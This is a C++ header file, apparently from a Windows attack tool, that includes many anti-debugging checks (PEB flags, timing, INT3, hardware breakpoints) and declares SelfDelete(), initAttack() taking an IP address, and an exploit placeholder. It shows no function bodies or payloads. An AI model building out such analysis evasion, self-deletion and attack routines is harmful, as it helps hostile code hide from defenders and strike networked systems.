
#pragma once
#include <windows.h>
#include <stdio.h>
#include <vector>
#include "Shlwapi.h"
#include "Common/Random/Random.h"
//
#include "Ninja\AntiDebugging\CPU\adbg_HardwareDebugRegisters\adbg_HardwareDebugRegisters.h"
#include "Ninja\AntiDebugging\CPU\adbg_MovSS\adbg_MovSS.h"
#include "Ninja\AntiDebugging\Exception\adbg_CloseHandleException\adbg_CloseHandleException.h"
#include "Ninja\AntiDebugging\Exception\adbg_Int2D\adbg_Int2D.h"
#include "Ninja\AntiDebugging\Exception\adbg_Int3\adbg_Int3.h"
#include "Ninja\AntiDebugging\Exception\adbg_PrefixHop\adbg_PrefixHop.h"
#include "Ninja\AntiDebugging\Exception\adbg_SingleStepException\adbg_SingleStepException.h"
#include "Ninja\AntiDebugging\Memory\adbg_BeingDebuggedPEB\adbg_BeingDebuggedPEB.h"
#include "Ninja\AntiDebugging\Memory\adbg_CheckRemoteDebuggerPresent\adbg_CheckRemoteDebuggerPresent.h"
#include "Ninja\AntiDebugging\Memory\adbg_CheckWindowName\adbg_CheckWindowName.h"
#include "Ninja\AntiDebugging\Memory\adbg_IsDebuggerPresent\adbg_IsDebuggerPresent.h"
#include "Ninja\AntiDebugging\Memory\adbg_NtGlobalFlagPEB\adbg_NtGlobalFlagPEB.h"
#include "Ninja\AntiDebugging\Memory\adbg_NtQueryInformationProcess\adbg_NtQueryInformationProcess.h"
//#include "Ninja\AntiDebugging\Memory\adbg_NtSetInformationThread\adbg_NtSetInformationThread.h"
#include "Ninja\AntiDebugging\Timing\adbg_GetTickCount\adbg_GetTickCount.h"
#include "Ninja\AntiDebugging\Timing\adbg_QueryPerformanceCounter\adbg_QueryPerformanceCounter.h"
#include "Ninja\AntiDebugging\Timing\adbg_RDTSC\adbg_RDTSC.h"


#define MAX_THREADS 1
//
//adbg_HardwareDebugRegisters

//adbg_MovSS

//adbg_CloseHandleException

//adbg_Int2D

//adbg_Int3

//adbg_PrefixHop

//adbg_SingleStepException

//adbg_BeingDebuggedPEB

//adbg_CheckRemoteDebuggerPresent

//adbg_CheckWindowName

//adbg_IsDebuggerPresent

//adbg_NtGlobalFlagPEB

//adbg_NtQueryInformationProcess

//adbg_NtSetInformationThread

//adbg_GetTickCount

//adbg_QueryPerformanceCounter

//adbg_RDTSC


PCHAR* CommandLineToArgvA(PCHAR CmdLine, int* _argc);
void SelfDelete();
void initAttack(int ipAddress[]);
//[headExploit]
void ipAr2Str(int ipAddress[],char* result);
